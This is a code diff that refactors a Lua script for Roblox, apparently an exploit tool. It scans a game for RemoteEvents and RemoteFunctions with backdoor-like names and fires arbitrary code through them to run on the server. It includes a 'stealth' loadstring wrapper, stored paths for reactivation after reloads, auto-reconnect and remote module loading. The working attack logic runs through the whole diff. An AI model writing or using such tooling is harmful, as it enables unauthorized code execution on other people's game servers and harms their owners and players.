@@ -11,7 +11,6 @@ _bs._s = tick()
 _bs._cb = nil
 _bs._currentGameId = nil
 
--- [NEW] Global storage to persist across reloads
 if not _G._pans_backdoor_storage then
     _G._pans_backdoor_storage = {}
 end
@@ -23,7 +22,7 @@ local _cfg = {
     maxScanDepth = 20,
     executionDelay = 0.05,
     monitorInterval = 2,
-    autoReconnect = true  -- [CHANGED] Auto reconnect enabled
+    autoReconnect = true
 }
 
 local _str = {
@@ -274,11 +273,60 @@ local function _selectRandomBackdoor(backdoors)
     return selected, backup
 end
 
--- [NEW] Find backdoor by stored path (for reactivation)
+-- [MOVED UP] Undetectable execution - defined before Execute
+local function _undetectableExec(code)
+    if not _bs._selected then
+        _log("No backdoor selected", "ERROR")
+        return false
+    end
+    
+    local r = _bs._selected.Object
+    local t = _bs._selected.Type
+    
+    local exists = pcall(function() return r.Parent end)
+    if not exists then
+        _log("Backdoor no longer exists!", "ERROR")
+        _bs.Disconnect()
+        return false
+    end
+    
+    local function method1()
+        if t == _str.RemoteEvent then
+            pcall(function() r:FireServer(code) end)
+        else
+            pcall(function() r:InvokeServer(code) end)
+        end
+    end
+    
+    local function method4()
+        local payload = ([[
+            local _c = "%s"
+            local _f = loadstring or load
+            if _f then pcall(_f, _c) end
+        ]]):format(code:gsub("\"", "\\\""))
+        
+        if t == _str.RemoteEvent then
+            pcall(function() r:FireServer(payload) end)
+        else
+            pcall(function() r:InvokeServer(payload) end)
+        end
+    end
+    
+    if _cfg.stealth then
+        local ok1 = pcall(method4)
+        if ok1 then return true end
+        local ok2 = pcall(method1)
+        return ok2
+    else
+        local ok = pcall(method1)
+        return ok
+    end
+end
+
+-- [MOVED UP] Find backdoor by stored path
 local function _findBackdoorByPath(path)
     if not path then return nil end
     
-    -- Try to find the remote by path
     local segments = {}
     for segment in string.gmatch(path, "[^%.]+") do
         table.insert(segments, segment)
@@ -301,7 +349,6 @@ local function _findBackdoorByPath(path)
             end
             
             if not found then
-                -- Try service
                 local ok, svc = pcall(function() return game:GetService(segment) end)
                 if ok and svc then
                     found = svc
@@ -314,7 +361,6 @@ local function _findBackdoorByPath(path)
         end
     end
     
-    -- Verify it's still a valid remote
     local isValid = pcall(function()
         return current:IsA("RemoteEvent") or current:IsA("RemoteFunction")
     end)
@@ -334,7 +380,78 @@ local function _findBackdoorByPath(path)
     return nil
 end
 
--- Monitor backdoor object
+-- [MOVED UP] Quick scan for reactivation
+local function _quickScan()
+    local quickServices = {
+        game:GetService("ReplicatedStorage"),
+        game:GetService("Workspace")
+    }
+    
+    local foundRemotes = {}
+    
+    for _, svc in ipairs(quickServices) do
+        local children = {}
+        pcall(function() children = svc:GetDescendants() end)
+        
+        for _, obj in ipairs(children) do
+            local isRemote = pcall(function()
+                return obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")
+            end)
+            
+            if isRemote then
+                local sus, score = _isSus(obj.Name)
+                if sus then
+                    table.insert(foundRemotes, {
+                        Object = obj,
+                        Name = obj.Name,
+                        Type = obj.ClassName,
+                        Path = obj:GetFullName(),
+                        Category = "MALICIOUS",
+                        RiskScore = score,
+                        Vulnerable = true,
+                        ExecutionMethod = "quick_reactivate"
+                    })
+                end
+            end
+        end
+    end
+    
+    if #foundRemotes > 0 then
+        local selected, backup = _selectRandomBackdoor(foundRemotes)
+        _bs._selected = selected
+        _bs._backup = backup
+        return true
+    end
+    
+    return false
+end
+
+-- [MOVED UP] Direct execution without active check
+local function _directExecute(code, backdoorInfo)
+    if not backdoorInfo or not backdoorInfo.Object then
+        return false
+    end
+    
+    local r = backdoorInfo.Object
+    local t = backdoorInfo.Type
+    
+    local exists = pcall(function() return r.Parent end)
+    if not exists then
+        return false
+    end
+    
+    local function tryExecute()
+        if t == _str.RemoteEvent then
+            pcall(function() r:FireServer(code) end)
+        else
+            pcall(function() r:InvokeServer(code) end)
+        end
+    end
+    
+    return pcall(tryExecute)
+end
+
+-- Monitor functions
 local function _startMonitoring()
     if _bs._monitor then
         pcall(function() _bs._monitor:Disconnect() end)
@@ -351,7 +468,6 @@ local function _startMonitoring()
     local name = target.Name
     local path = _bs._selected.Path
     
-    -- Store in global for persistence
     _storage.selectedPath = path
     _storage.selectedType = _bs._selected.Type
     
@@ -391,7 +507,6 @@ local function _startMonitoring()
     end)
 end
 
--- Monitor for game leave/change
 local function _startGameMonitoring()
     if _bs._gameMonitor then
         pcall(function() _bs._gameMonitor:Disconnect() end)
@@ -411,7 +526,7 @@ local function _startGameMonitoring()
         local currentGameId = tostring(game.GameId)
         if currentGameId ~= _bs._currentGameId then
             _log("GAME_CHANGED: " .. _bs._currentGameId .. " -> " .. currentGameId, "LEAVE")
-            _storage.selectedPath = nil  -- Clear stored path
+            _storage.selectedPath = nil
             print("PANS_PLAYER_LEFT:GameChanged")
             _bs.Disconnect()
             return
@@ -463,32 +578,7 @@ local function _stopMonitoring()
     _bs._currentGameId = nil
 end
 
--- [NEW] Direct execution without active check (fallback)
-local function _directExecute(code, backdoorInfo)
-    if not backdoorInfo or not backdoorInfo.Object then
-        return false
-    end
-    
-    local r = backdoorInfo.Object
-    local t = backdoorInfo.Type
-    
-    local exists = pcall(function() return r.Parent end)
-    if not exists then
-        return false
-    end
-    
-    local function tryExecute()
-        if t == _str.RemoteEvent then
-            pcall(function() r:FireServer(code) end)
-        else
-            pcall(function() r:InvokeServer(code) end)
-        end
-    end
-    
-    return pcall(tryExecute)
-end
-
--- [MODIFIED] Execute with auto-reactivation
+-- NOW Define Execute (after all helper functions are defined)
 function _bs.Execute(code)
     -- First check if we have an active backdoor
     if _bs._a and _bs._selected then
@@ -496,7 +586,7 @@ function _bs.Execute(code)
         return _undetectableExec(code)
     end
     
-    -- [NEW] Try to reactivate from storage
+    -- Try to reactivate from storage
     if _storage.selectedPath then
         _log("Attempting reactivation from storage: " .. _storage.selectedPath, "REACTIVATE")
         
@@ -505,7 +595,6 @@ function _bs.Execute(code)
             _bs._selected = restored
             _bs._a = true
             
-            -- Restart monitoring
             _startMonitoring()
             
             _log("Reactivated successfully!", "REACTIVATE")
@@ -516,11 +605,11 @@ function _bs.Execute(code)
         end
     end
     
-    -- [NEW] Last resort: try quick scan
+    -- Last resort: try quick scan
     if _cfg.autoReconnect then
         _log("Attempting quick scan for reactivation...", "REACTIVATE")
         
-        local found = _bs.QuickScan()
+        local found = _quickScan()
         if found and _bs._selected then
             _bs._a = true
             _startMonitoring()
@@ -533,103 +622,7 @@ function _bs.Execute(code)
     return false
 end
 
--- [NEW] Quick scan for reactivation (faster than full scan)
-function _bs.QuickScan()
-    -- Only scan common locations
-    local quickServices = {
-        game:GetService("ReplicatedStorage"),
-        game:GetService("Workspace")
-    }
-    
-    local foundRemotes = {}
-    
-    for _, svc in ipairs(quickServices) do
-        local children = {}
-        pcall(function() children = svc:GetDescendants() end)
-        
-        for _, obj in ipairs(children) do
-            local isRemote = pcall(function()
-                return obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")
-            end)
-            
-            if isRemote then
-                local sus, score = _isSus(obj.Name)
-                if sus then
-                    table.insert(foundRemotes, {
-                        Object = obj,
-                        Name = obj.Name,
-                        Type = obj.ClassName,
-                        Path = obj:GetFullName(),
-                        Category = "MALICIOUS",
-                        RiskScore = score,
-                        Vulnerable = true,
-                        ExecutionMethod = "quick_reactivate"
-                    })
-                end
-            end
-        end
-    end
-    
-    if #foundRemotes > 0 then
-        local selected, backup = _selectRandomBackdoor(foundRemotes)
-        _bs._selected = selected
-        _bs._backup = backup
-        return true
-    end
-    
-    return false
-end
-
--- Undetectable execution
-local function _undetectableExec(code)
-    if not _bs._selected then
-        _log("No backdoor selected", "ERROR")
-        return false
-    end
-    
-    local r = _bs._selected.Object
-    local t = _bs._selected.Type
-    
-    local exists = pcall(function() return r.Parent end)
-    if not exists then
-        _log("Backdoor no longer exists!", "ERROR")
-        _bs.Disconnect()
-        return false
-    end
-    
-    local function method1()
-        if t == _str.RemoteEvent then
-            pcall(function() r:FireServer(code) end)
-        else
-            pcall(function() r:InvokeServer(code) end)
-        end
-    end
-    
-    local function method4()
-        local payload = ([[
-            local _c = "%s"
-            local _f = loadstring or load
-            if _f then pcall(_f, _c) end
-        ]]):format(code:gsub("\"", "\\\""))
-        
-        if t == _str.RemoteEvent then
-            pcall(function() r:FireServer(payload) end)
-        else
-            pcall(function() r:InvokeServer(payload) end)
-        end
-    end
-    
-    if _cfg.stealth then
-        local ok1 = pcall(method4)
-        if ok1 then return true end
-        local ok2 = pcall(method1)
-        return ok2
-    else
-        local ok = pcall(method1)
-        return ok
-    end
-end
-
+-- Main scan function
 function _bs.Scan()
     _log("Starting scan...", "SCAN")
     _bs._r = {}
@@ -715,7 +708,6 @@ function _bs.Scan()
     return _bs._selected ~= nil, #_bs._n
 end
 
--- [MODIFIED] Require with auto-reactivation
 function _bs.Require(mid)
     if type(mid) == "number" then mid = tostring(mid) end
     
@@ -724,7 +716,6 @@ function _bs.Require(mid)
         if s then print("[BD] Loaded:",r)return r else warn("[BD] Fail:",r)end
     ]]):format(mid)
     
-    -- Use Execute which now has auto-reactivation
     return _bs.Execute(requireCode)
 end
 
@@ -732,7 +723,6 @@ function _bs.Initialize(cb, cfg)
     _bs._cb = cb
     if cfg then for k,v in pairs(cfg) do _cfg[k] = v end end
     
-    -- [NEW] Check if we have stored backdoor from previous session
     if _storage.selectedPath then
         _log("Found stored backdoor: " .. _storage.selectedPath, "INIT")
     end
@@ -774,7 +764,7 @@ function _bs.GetStatus()
         Active = _bs._a,
         HasSelection = _bs._selected ~= nil,
         SelectedPath = _bs._selected and _bs._selected.Path or nil,
-        StoredPath = _storage.selectedPath,  -- [NEW]
+        StoredPath = _storage.selectedPath,
         BackupCount = #_bs._backup,
         NormalRemotes = #_bs._n,
         ScanTime = tick() - _bs._s,
